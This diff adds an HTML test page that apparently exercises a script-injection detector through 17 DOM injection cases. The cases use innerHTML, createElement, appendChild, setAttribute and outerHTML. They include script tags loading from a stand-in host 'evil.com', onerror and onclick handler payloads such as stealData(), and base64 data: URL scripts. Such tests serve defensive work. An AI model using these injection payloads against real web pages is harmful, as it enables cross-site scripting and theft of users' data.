@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Script Injection Test</title>
+</head>
+<body>
+  <h1>Script Injection Test</h1>
+  <div id="test-container"></div>
+
+  <script>
+    // Wait for instrumentation to load
+    setTimeout(function() {
+      const container = document.getElementById('test-container');
+
+      // Test 1: innerHTML with script tag
+      console.log('[Test 1] innerHTML with script tag');
+      container.innerHTML = '<script src="https://evil.com/malware.js"></script>';
+
+      // Test 2: innerHTML with event handler (onerror)
+      console.log('[Test 2] innerHTML with onerror handler');
+      container.innerHTML = '<img src="x" onerror="alert(1)">';
+
+      // Test 3: innerHTML with onclick handler
+      console.log('[Test 3] innerHTML with onclick handler');
+      container.innerHTML = '<button onclick="maliciousFunction()">Click me</button>';
+
+      // Test 4: createElement with script + src
+      console.log('[Test 4] createElement with script src');
+      const script1 = document.createElement('script');
+      script1.src = 'https://evil.com/payload.js';
+
+      // Test 5: createElement with script + textContent
+      console.log('[Test 5] createElement with script textContent');
+      const script2 = document.createElement('script');
+      script2.textContent = 'alert("Injected code");';
+
+      // Test 6: createElement with script + data: URL (base64)
+      console.log('[Test 6] createElement with data: URL (base64)');
+      const script3 = document.createElement('script');
+      script3.src = 'data:text/javascript;base64,YWxlcnQoIkJhc2U2NCBpbmplY3Rpb24iKTs=';
+
+      // Test 7: createElement with script + blob: URL
+      console.log('[Test 7] createElement with blob: URL');
+      const script4 = document.createElement('script');
+      script4.src = 'blob:http://example.com/12345678-1234-1234-1234-123456789012';
+
+      // Test 8: appendChild with script element
+      console.log('[Test 8] appendChild with script element');
+      const script5 = document.createElement('script');
+      script5.src = 'https://evil.com/appended.js';
+      document.body.appendChild(script5);
+
+      // Test 9: insertBefore with script element
+      console.log('[Test 9] insertBefore with script element');
+      const script6 = document.createElement('script');
+      script6.textContent = 'console.log("Inserted script")';
+      document.body.insertBefore(script6, document.body.firstChild);
+
+      // Test 10: insertAdjacentHTML with script
+      console.log('[Test 10] insertAdjacentHTML with script');
+      container.insertAdjacentHTML('beforeend', '<script>console.log("Adjacent script")</script>');
+
+      // Test 11: document.write with script
+      console.log('[Test 11] document.write with script');
+      // Note: Can't actually call document.write here as it would clear the page
+      // But we'll test the instrumentation is set up
+
+      // Test 12: setAttribute with onclick
+      console.log('[Test 12] setAttribute with onclick');
+      const btn = document.createElement('button');
+      btn.setAttribute('onclick', 'evilFunction()');
+
+      // Test 13: setAttribute with onerror
+      console.log('[Test 13] setAttribute with onerror');
+      const img = document.createElement('img');
+      img.setAttribute('onerror', 'stealData()');
+
+      // Test 14: outerHTML with script
+      console.log('[Test 14] outerHTML with script');
+      const div = document.createElement('div');
+      container.appendChild(div);
+      div.outerHTML = '<div><script src="outer.js"></script></div>';
+
+      // Test 15: Multiple scripts in innerHTML
+      console.log('[Test 15] Multiple scripts in innerHTML');
+      container.innerHTML = '<script src="script1.js"></script><script src="script2.js"></script>';
+
+      // Test 16: innerHTML with multiple event handlers
+      console.log('[Test 16] Multiple event handlers in innerHTML');
+      container.innerHTML = '<div onclick="a()" onmouseover="b()" onerror="c()">Test</div>';
+
+      // Test 17: data: URL without base64
+      console.log('[Test 17] data: URL without base64');
+      const script7 = document.createElement('script');
+      script7.src = 'data:text/javascript,alert("Not%20base64")';
+
+      console.log('[Script Injection Tests] All tests completed');
+    }, 100);
+  </script>
+</body>
+</html>
